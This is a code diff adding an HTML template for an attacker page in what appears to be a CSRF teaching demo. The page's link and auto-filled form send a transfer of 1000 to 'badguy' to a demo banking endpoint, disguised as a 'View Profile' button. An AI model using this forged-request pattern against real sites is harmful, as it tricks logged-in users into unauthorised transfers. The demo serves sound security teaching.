@@ -1,0 +1,25 @@
+{{define "formpost"}}<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Hello from Attacker!</h2>
+
+<p>
+    For normal GET request, browser will not validate anything.<br>
+    If cookie is there, it will attach to the request.
+</p>
+
+<a href="http://domain1.com:1323/api/transfer2?to=badguy&amount=1000">Click to View Profile (Not working)</a>
+<form method="POST" action="http://domain1.com:1323/api/transfer2">
+    To:<br>
+    <input type="text" name="to" value="badguy">
+    <br>
+    Amount:<br>
+    <input type="number" name="amount" value="1000">
+    <br><br>
+    <input type="submit" value="Click to View Profile (Working)">
+</form>
+
+</body>
+</html>
+{{end}}
